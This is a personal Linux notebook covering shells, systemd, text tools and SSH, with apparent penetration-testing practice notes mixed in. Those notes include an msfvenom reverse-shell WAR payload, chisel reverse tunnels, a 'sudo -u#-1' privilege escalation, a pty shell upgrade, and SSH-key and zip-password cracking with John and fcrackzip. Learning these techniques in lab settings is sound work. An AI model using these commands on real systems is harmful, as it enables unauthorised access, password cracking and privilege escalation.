# Linux - General notes
# File descriptors
https://unix.stackexchange.com/questions/42728/what-does-31-12-23-do-in-a-script

>0 - stdin  
>1 - stdout  
>2 - stderr  

So each of these numbers in your command refer to a file descriptor. You can either redirect a file descriptor to a file with 	 or redirect it to another file descriptor with 	&

The `3&1` in your command line will create a new file descriptor and redirect it to 1 which is ``STDOUT``. Now `1&2` will redirect the file descriptor 1 to `STDERR` and `2&3` will redirect file descriptor 2 to 3 which is STDOUT.

So basically you switched `STDOUT` and `STDERR,` these are the steps:

- Create a new fd `3` and point it to the fd `1`

- Redirect file descriptor `1` to file descriptor `2.` If we wouldn't have saved the file descriptor in `3` we would lose the target.

- Redirect file descriptor `2` to file descriptor `3.` Now file descriptors one and two are switched.

Now if the program prints something to the file descriptor `1,` it will be printed to the file descriptor `2` and vice versa.

# TERMINAL vs TTY vs PTY vs CONSOLE
## TTY
A tty is a physical terminal-teletype port on a computer (usually a serial port).
`tty` originally meant `teletype` and `pty` means `pseudo-teletype`.

In UNIX, `/dev/tty*` is any device that acts like a `teletype`, ie, a terminal. (Called teletype because that's what we had for terminals in those benighted days.)

## PTY
A Teletype `tty` can also be emulated by a computer program running as a module in kernel space.
A pty is a pseudo-teletype port provided by a computer Operating System Kernel to connect user land terminal emulation software programs such as ssh, [xterm](https://www.computerhope.com/unix/uxterm.htm), or screen.
A `pty` is a pseudotty, a device entry that acts like a terminal to the process reading and writing there, but is managed by another program. They first appeared (as I recall) for X Window and screen and the like, where you needed something that acted like a terminal but could be used from another program.

## TELETYPE
The word teletype is a shorting of the telegraph typewriter, or teletypewriter device from the 1930s - itself an electromagnetic device which replaced the telegraph encoding machines of the 1830s and 1840s.

![https://i.stack.imgur.com/2EoB1.jpg](https://i.stack.imgur.com/2EoB1.jpg)

TTY - Teletypewriter 1930s

## TERMINAL
A terminal is simply a computer's user interface that uses text for input and output.

## OS Implementations
These use pseudo-teletype ports however, their naming and implementations have diverged a little.

### Linux
Linux mounts a special file system devpts on /dev (the 's' presumably standing for serial) that creates a corresponding entry in /dev/pts for every new terminal window you open, e.g. /dev/pts/0

`pts` stands for `pseudo terminal slave`.

`/dev/` is a special directory for device files. These are abstractions, they are not real files on disk. The directory is populated at boot and subject to change to reflect existing device interfaces, which are created and destroyed by the kernel and a userspace daemon, udevd.

Many of the devices so represented are virtual. This includes the entries in /dev/pts, which are console devices. This is why one is created for remote sessions; they are also created when you open a local GUI terminal.

You can open them as files, although it's not of much use value. To get the /dev/pts node your shell is connected, use tty:

	tty
	/dev/pts/4

Now switch to some other console and try:

	echo "duck!" > /dev/pts/4

### MacOS
macOS/FreeBSD also use the /dev file structure however, they use a numbered TTY naming convention ttys for every new terminal window you open e.g. /dev/ttys002

### Windows
Microsoft Windows still has the concept of an LPT port for Line Printer Terminals within it's Command Shell for output to a printer./_resources/tty.jpg

## STTY COMMANDS
On Unix-like operating systems, the stty command changes and prints terminal line settings.

### raw vs cooked mode
Cooked is the default mode.

The terms raw and cooked only apply to terminal drivers. "Cooked" is called canonical and "raw" is called non-canonical mode.

The terminal driver is, by default a line-based system: characters are buffered internally until a carriage return (Enter or Return) before it is passed to the program - this is called "cooked". This allows certain characters to be processed (see stty(1)), such as CtrlD, CtrlS, CtrlU, Backspace); essentially rudimentary line-editing. The terminal driver "cooks" the characters before serving them up.

The terminal can be placed into "raw" mode where the characters are not processed by the terminal driver, but are sent straight through (it can be set that INTR and QUIT characters are still processed). This allows programs like emacs and vi to use the entire screen more easily.

Example:

	stty raw -echo

With that command, the terminal will not process the command and it will send the command directly because we use the `raw` param. Then it will not echo the command because we minus the `echo` command with the `-echo` param.
https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x

## TTY COMMAND
Linux operating system represents everything in a file system, the hardware devices that we attach are also represented as a file. The terminal is also represented as a file. There a command exists called tty which displays information related to terminal. The tty command of terminal basically prints the file name of the terminal connected to standard input. tty is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system.

# SUDOERS Syntax

		root ALL=(ALL:ALL) ALL

Read it as: ***`WHO WHERE=(as_whom) what command`***.

- The first ALL is used to define HOSTS. We can define Hostname/Ip-Address instead of ALL. ALL means any host.
- Second ALL : Third ALL is User:Group. Instead of ALL we can define User or User with the group like User:Group. ALL:ALL means All users and All groups.
- Last ALL is the Command. Instead of ALL, we can define a command or set of commands. ALL means all commands.

# USER IDs
## Real, Effective, & Saved UID/GID

A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID.

The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID.

Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.

- Print real and effective user / group IDs:

		id
		
		uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
		groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

# Systemd - Create a custom service
https://superuser.com/questions/759759/writing-a-service-that-depends-on-xorg

- Create a file inside the `/etc/systemd/user/` folder. For example, `myscript.service`:

	```
	[Unit]
	Description=Brightness Script

	[Service]
	ExecStart=/usr/bin/brightness
	PIDFile=%h/.%p.pid

	[Install]
	WantedBy=multi-user.target 	
	```

- Start the service with `systemctl`

		systemctl --user start myscript.service

- To list all the service on the machine

		systemctl --user list-unit-files

# IFS
https://bash.cyberciti.biz/guide/$IFS

- The IFS is a special shell variable.
- You can change the value of IFS as per your requirments.
- The Internal Field Separator (IFS) that is used for word splitting after expansion and to split lines into words with the read builtin command.

The default value of IFS is a space, a tab, and a newline.

- Create a text file called /tmp/domains.txt as follows:

		cyberciti.biz|202.54.1.1|/home/httpd|ftpcbzuser
		nixcraft.com|202.54.1.2|/home/httpd|ftpnixuser
		Create a shell script called setupapachevhost.sh as follows:

- Create a shell script called setupapachevhost.sh as follows:

	```
	#!/bin/bash
	# setupapachevhost.sh - Apache webhosting automation demo script
	file=/tmp/domains.txt

	# set the Internal Field Separator to |
	IFS='|'
	while read -r domain ip webroot ftpusername
	do
		printf "*** Adding %s to httpd.conf...\n" $domain
		printf "Setting virtual host using %s ip...\n" $ip
		printf "DocumentRoot is set to %s\n" $webroot
		printf "Adding ftp access for %s using %s ftp account...\n\n" $domain $ftpusername
		
	done < "$file"
	```

- Sample outputs:

		*** Adding cyberciti.biz to httpd.conf...
		Setting virtual host using 202.54.1.1 ip...
		DocumentRoot is set to /home/httpd
		Adding ftp access for cyberciti.biz using ftpcbzuser ftp account...

		*** Adding nixcraft.com to httpd.conf...
		Setting virtual host using 202.54.1.2 ip...
		DocumentRoot is set to /home/httpd
		Adding ftp access for nixcraft.com using ftpnixuser ftp account...

# Systemd
## Units (targets,services,sockets)
### Services

> A unit configuration file whose name ends in .service encodes information about a process controlled and supervised by systemd.

Systemd service units are the units that actually execute and keep track of programs and daemons, and dependencies are used to make sure that services are started in the right order. They are the most commonly used type of units.

### Sockets

> A unit configuration file whose name ends in ".socket" encodes information about an IPC or network socket or a file system FIFO controlled and supervised by systemd, for socket-based activation.

Socket units on the other hand don't actually start daemons on their own. Instead, they just sit there and listen on an IP address and a port, or a UNIX domain socket, and when something connects to it, the daemon that the socket is for is started and the connection is handed to it.

This is useful for making sure that big daemons that take up a lot of resources but are rarely used aren't running and taking up resources all the time, but instead they are only started when needed.

### Targets
https://wiki.archlinux.org/index.php/systemd#Targets

> A unit configuration file whose name ends in ".target" encodes information about a target unit of systemd, which is used for grouping units and as well-known synchronization points during start-up.

Targets are used for grouping and ordering units. They are somewhat of a rough equivalent to runlevels in that at different targets, different services, sockets, and other units are started. Unlike runlevels, they are much more free-form and you can easily make your own targets for ordering units, and targets have dependencies among themselves.

For instance, multi-user.target is what most daemons are grouped under, and it requires basic.target to be activated, which means that all services grouped under basic.target will be started before the ones in multi-user.target.

| Id        | Targets                                               | Description                                                                                       |
| --------- | ---------------------------------                     | ------------------------------------------------------------------------------------------------- |
| 0         | runlevel0.target, poweroff.target                     | Halt the system.                                                                                  |
| 1         | runlevel1.target, rescue.target                       | Single user                                                                                       |
| 2         | runlevel2.target, runlevel4.target, multi-user.target | User-defined/Site-specific runlevels. By default, identical to 3                                  |
| 3         | runlevel3.target, multi-user.target                   | Multi-user, non-graphical. Users can usually login via multiple consoles or via the network.      |
| 5         | runlevel5.target, graphical.target                    | Multi-user, graphical. Usually has all the services of runlevel 3 plus a graphical login.         |
| 6         | runlevel6.target, reboot.target                       | Reboot.                                                                                           |
| Emergency | Emergency.target                                      | Emergency shell.                                                                                  |

## SystemCtl
Systemd is a software suite that's present on many [Linux distributions](https://linuxconfig.org/linux-download). It's not quite ubiquitous, but it's a staple on the most popular distros, including [Debian](https://linuxconfig.org/debian-linux-download), [Ubuntu](https://linuxconfig.org/ubuntu-linux-download), [Fedora](https://linuxconfig.org/fedora-linux-download), [Manjaro and Arch](https://linuxconfig.org/manjaro-linux-vs-arch-linux), and more.

What it's best known for is having the ability to control processes running on a system. Using systemd, you can start or stop any service installed on Linux. It's also an easy tool to list information about the services, such as if they are running, if they start automatically at boot up, etc.

- To see every loaded service on the system, open a [command line](https://linuxconfig.org/linux-command-line-tutorial) terminal and execute the following command.

		systemctl list-units --type=service

- List of all services marked as active

		systemctl list-units --type=service --state=running 

[![List of actively running services](https://linuxconfig.org/images/02-how-to-use-systemctl-to-list-services-on-systemd-linux.png)](https://linuxconfig.org/images/02-how-to-use-systemctl-to-list-services-on-systemd-linux.png "List of actively running services")

- You can also see the loaded but inactive units by passing the `--all` option. This will list a lot more services, which may be irrelevant if you only need to see active and running services.

		systemctl list-units --type=service --all

- To see which services are enabled (meaning that they will start automatically when your system boots up), use the following command:

		systemctl list-unit-files --state=enabled

[![List of services that are enabled to start automatically](https://linuxconfig.org/images/03-how-to-use-systemctl-to-list-services-on-systemd-linux.png)](https://linuxconfig.org/images/03-how-to-use-systemctl-to-list-services-on-systemd-linux.png "List of services that are enabled to start automatically")

- Change the state to disabled if you want to see disabled services (which won't start up automatically):

		systemctl list-unit-files --state=disabled

[![List of disabled services](https://linuxconfig.org/images/04-how-to-use-systemctl-to-list-services-on-systemd-linux.png)](https://linuxconfig.org/images/04-how-to-use-systemctl-to-list-services-on-systemd-linux.png "List of disabled services")

- You can always check for more information about a specific service by checking its status in systemd. For example:

		systemctl status cups.service

[![Checking the status of a specific service within systemd](https://linuxconfig.org/images/05-how-to-use-systemctl-to-list-services-on-systemd-linux.png)](https://linuxconfig.org/images/05-how-to-use-systemctl-to-list-services-on-systemd-linux.png "Checking the status of a specific service within systemd")

***
## Analyse systemd and services

To check how services run at boot time. 

		systemd-analyze plot > startup_order.svg
		systemd-analyze critical-chain --fuzz 1h
		systemd-analyze critical-chain network.target local-fs.target

***
# GitHub
Clone a single branch

	git clone -b mybranch git://sub.domain.com/repo.git

Get a single folder with svc

1. **Navigate to the folder you want to download**. Let's download /test from master branch.

![github repo URL example](https://i.stack.imgur.com/tgGVd.png)
2. **Modify the URL for subversion**. Replace tree/master with trunk.

https://github.com/lodash/lodash/tree/master/test ➜

https://github.com/lodash/lodash/trunk/test

3. **Download the folder**. Go to the command line and grab the folder with SVN.

svn checkout https://github.com/lodash/lodash/trunk/test

You might not see any activity immediately because Github takes up to 30 seconds to convert larger repositories, so be patient.

Full URL format explanation:

- If you're interested in master branch, use trunk instead. So the full path is trunk/foldername
- If you're interested in foo branch, use branches/foo instead. The full path looks like branches/foo/foldername
- Protip: You can use svn ls to see available tags and branches before downloading if you wish

# Linux file type designator
https://linuxize.com/post/how-to-list-files-in-linux-using-the-ls-command/

	- d (directory)
	- c (character device)
	- l (symlink)
	- p (named pipe)
	- s (socket)
	- b (block device)
	- D (door, not common on Linux systems, but has been ported)

## Special files in Linux (block/character)
https://www.computerhope.com/jargon/s/special-file.htm#character-special
https://unix.stackexchange.com/questions/60034/what-are-character-special-and-block-special-files-in-a-unix-system


The purpose of a special file is to expose the device as a file in the file system. A special file provides a universal interface for hardware devices (and virtual devices created and used by the kernel), because tools for file I/O can access the device.

When data is red from or written to a special file, the operation happens immediately, and is not subject to conventional filesystem rules.

In Linux, there are two types of special files: block special file and character special file.

Block devices (also called block special files) usually behave a lot like ordinary files: they are an array of bytes, and the value that is read at a given location is the value that was last written there. Data from block device can be cached in memory and read back from cache; writes can be buffered. Block devices are normally seekable (i.e. there is a notion of position inside the file which the application can change). The name “block device” comes from the fact that the corresponding hardware typically reads and writes a whole block at a time (e.g. a sector on a hard disk).

Character devices (also called character special files) behave like pipes, serial ports, etc. Writing or reading to them is an immediate action. What the driver does with the data is its own business. Writing a byte to a character device might cause it to be displayed on screen, output on a serial port, converted into a sound, ... Reading a byte from a device might cause the serial port to wait for input, might return a random byte (/dev/urandom), ... The name “character device” comes from the fact that each character is handled individually.

# SSH
## Set XTERM when connecting

	ssh rock@target TERM=xterm

## SSH and get a better shell

If we have messages like "rbash: PATH: readonly variable"

	ssh ghost@ghost -t "bash -l"

## Fixing rbash problem
If we have the message "-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names"

Then we can fix the path like this:

	export PATH=$PATH:/bin/:/usr/bin/

## SSH-Keygen
https://www.hackingloops.com/ssh-for-penetration-testing/

## Generate a pair of keys with a neutral(blank) passphrase

	ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ''

## Copy the ***key.pub*** on the target and use the ***key*** file to connect to the target

	ssh -i key user@10.10.10.197

## Crack an SSH Key with JOHN
https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/

	python ssh2john.py id_rsa > id_rsa.hash
	john --wordlist=darkweb2017-top10.txt id_rsa.hash

## Create a tunnel and forward a port to the local box
https://www.ssh.com/ssh/tunneling/example

	ssh -L 80:intra.example.com:80 user@10.10.10.10

# Command Watch
## Watch file modification in real time

	watch -d "ls /mnt/Users/Public/*; ls /mnt/ZZ_ARCHIVE/0xdf*"

# AWK
Print only a specific line from a file

	awk 'NR==3{ print; }' filename

To lower and upper cases

	echo "ALL" | awk '{print tolower($0)}'
	hi all

Extract values between brackets, square brackets etc...

	cat rpc-users | awk -F'[][]' '{print $2}'
	cat rpc-users | awk -F'[()]' '{print $2}'
	cat rpc-users | awk -F'[{}]' '{print $2}'

# GREP
## Extract email from strings

	grep -EiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' dbdump.txt

## Enumerate directories

	ls -lRa /mnt/SYSVOL/HTB.LOCAL/ --color=always | grep -E "^-|:" --color

## Find words composed with letters and digits

	grep -P ([A-Za-z]+[\d@]+[\w@]*|[\d@]+[A-Za-z]+[\w@]*)

## Search for words in files

	grep -rnw '/path/to/somewhere/' -e 'pattern'

-r or -R is recursive,
-n is line number, and
-w stands for match the whole word.
-l (lower-case L) can be added to just give the file name of matching files.

Ref: https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux

# SED
## Basic syntax  
https://vim.fandom.com/wiki/Search_and_replace
https://www.journaldev.com/28984/linux-sed-command-examples

	sed -i 's/SEARCH_REGEX/REPLACEMENT/g' INPUTFILE

***-i***: By default sed writes its output to the standard output. This option tells sed to edit files in place. If an extension is supplied (ex -i.bak) a backup of the original file will be created.*

***-g***: Global replacement flag. By default, sed reads the file line by line and changes only the first occurrence of the SEARCH_REGEX on a line. When the replacement flag is provided, all occurrences will be replaced.*
***-s***: Substitute a string
***-d***: Delete a line

-`\(\)` create patterns  
-`[a-zA-Z '";:]` only includes these characters
## Remove spaces

	sed 's/[ ][ ]*/ /g'

	sed 's/\s\s*/ /g'

	Find blank spaces

	sed 's/[[:blank:]]*$//' file

OR

	sed 's/ *$//' file

## Remove white lines

	sed -i '/^$/d' file.txt

## Get the first letter of words (check script f)

	$ echo 'Ken Van de Wilde' | sed 's/\B\w*//g;s/\s//g'

	Output:
	KVdW

OR

	$ echo "Tom" | sed 's/\(\w\)\w*\( \|$\)/\1/g')

## Prepend one line at the begining of a file

	sed -i '1iMyfirstLine' myfile.txt

## Only output one line of a stream

	sed -n '3p'

# WGET
Using file as a request (e.g: SOAP request)

	wget --post-file=soaprequest.xml --header="Content-Type: text/xml" --header="SOAPAction: \"soapaction\"" http://server/app/myservice.asmx -O response.xml

# XCLIP

	cat file | xclip

	cat file | xclip -selection clipboard

# CURL 
https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76

- To connect to an ftp server (list files)

	curl -s -v -P - 'ftp://backupmgr:REMOVED@172.20.0.1/'

- To upload file on an ftp server

	curl -T shell.sh -P 'ftp://backupmgr:REMOVED@172.20.0.1/'

- Get local file with curl

	curl "file:///root/root.txt"

- Upload file via post method

	curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS

- Get time delay for the server to respond

	curl http://blabla.com -w "%{time_total}"

# METASPLOIT
https://www.offensive-security.com/metasploit-unleashed/modules-and-locations/

## Loading additional modules

	root@kali:~# msfconsole -m ~/secret-modules/

	msf > loadpath
	Usage: loadpath </path/to/modules>

	Loads modules from the given directory which should contain subdirectories for
	module types, e.g. /path/to/modules/exploits

	msf > loadpath /usr/share/metasploit-framework/modules/
	Loaded 399 modules:
	    399 payloads

# Decrypt a file who was encrypted with an rsa key
https://medium.com/@Rehman.Beg/hackthebox-crypto-weak-rsa-challenge-62db8153b66f

We got this tool [*https://github.com/Ganapati/RsaCtfTool*](https://github.com/Ganapati/RsaCtfTool) to complete this challenge

	python RsaCtfTool.py — publickey key.pub — uncipherfile flag.enc

# Chisel
https://github.com/jpillora/chisel/releases/tag/v1.6.0 (to download a release instead of the repo)

To create a reverse tcp tunnel and exploit a port. (can bypass firewall)

- On kali start chisel as a server on a port of your choice.

		sudo chisel_1.6.0_linux_amd64 server --port 9002 --reverse

- On the remote machine, start chisel on the same port and specify the local port to exploit with the reverse tunnel.

		.\chisel.exe client 10.10.14.16:9002 R:910:127.0.0.1:910
		.\chisel.exe client 10.10.14.16:9999 R:910:127.0.0.1:910

# XXD Command
## Convert Hex dump to text

	xxd -r data.txt foobar.bin
	file foobar.bin

# OPENSSL COMMAND
## Generate pair of keys (public /private)

	openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr

## Generate a private key from **p12 file**

	openssl pkcs12 -in amanda.p12 -nocerts -out amanda.key

### GENERATE A WAR FILE

	msfvenom -p java/shell_reverse_tcp lhost=10.10.0.1 lport=4321 -f war -o pwn.war

# Netcat
https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533

## Transfert file with `netcat`

	nc -lvnp > file.txt
	nc <ip> <port> < file.txt

# Elevate command prompt

	sudo -u#-1 /bin/bash

	OR

	python -c 'import pty;pty.spawn("/bin/bash");'
	CTRL+Z
	stty raw -echo
	fg
	fg

# ICONV

	iconv [options] [-f from-encoding] [-t to-encoding] [inputfile]
	sudo iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou-utf8.txt

# ZIP Tools

## Crack Zip using `John`

	zip2john archive.zip > hash
	john hash --fork=4 -w=/home/user/rockyou.txt


## Crack zip files with `FRACKZIP`

	fcrackzip -p /usr/share/wordlists/rockyou.txt backup.zip -v -u -D

